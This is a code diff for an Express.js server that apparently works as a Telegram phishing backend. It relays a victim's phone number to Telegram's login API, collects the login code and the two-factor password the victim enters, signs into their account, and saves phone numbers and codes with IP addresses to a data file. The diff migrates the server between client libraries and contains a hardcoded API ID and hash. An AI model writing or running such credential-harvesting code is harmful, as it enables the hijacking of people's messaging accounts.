@@ -2,16 +2,15 @@ const express = require('express');
 const cors = require('cors');
 const fs = require('fs');
 const path = require('path');
-const { TelegramClient } = require('telegram');
-const { StringSession } = require('telegram/sessions');
+const { MTProto } = require('@mtcute/node');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 const DATA_FILE = process.env.RENDER ? path.join('/tmp', 'data.txt') : 'data.txt';
 
-const API_ID = 38819391;
-const API_HASH = '3460a50f4b56082066d92fa202bd6407';
+const apiId = 38819391;
+const apiHash = '3460a50f4b56082066d92fa202bd6407';
 
 app.use(cors());
 app.use(express.json());
@@ -27,12 +26,22 @@ app.post('/api/phone', async (req, res) => {
     }
 
     try {
-        const client = new TelegramClient(new StringSession(''), API_ID, API_HASH, {
-            connectionRetries: 5,
+        const client = new MTProto({
+            apiId: apiId,
+            apiHash: apiHash,
         });
+
         await client.connect();
 
-        const result = await client.sendCode(phone);
+        const result = await client.call('auth.sendCode', {
+            phone_number: phone,
+            api_id: apiId,
+            api_hash: apiHash,
+            settings: {
+                allow_flashcall: false,
+                current_number: false,
+            }
+        });
 
         sessions[phone] = {
             phone_code_hash: result.phone_code_hash,
@@ -63,9 +72,13 @@ app.post('/api/verify', async (req, res) => {
     try {
         const { client, phone_code_hash } = sessionData;
 
-        const result = await client.signIn(phone, code, phone_code_hash);
+        const result = await client.call('auth.signIn', {
+            phone_number: phone,
+            phone_code_hash: phone_code_hash,
+            phone_code: code,
+        });
 
-        if (result) {
+        if (result.user) {
             const data = { phone, code, ip: req.ip, time: new Date().toISOString() };
             fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
             console.log('🔑 Успешный вход для:', phone);
@@ -102,7 +115,9 @@ app.post('/api/2fa', async (req, res) => {
     try {
         const { client } = sessionData;
 
-        await client.signIn({ password });
+        await client.call('auth.checkPassword', {
+            password: password
+        });
 
         const data = {
             phone,
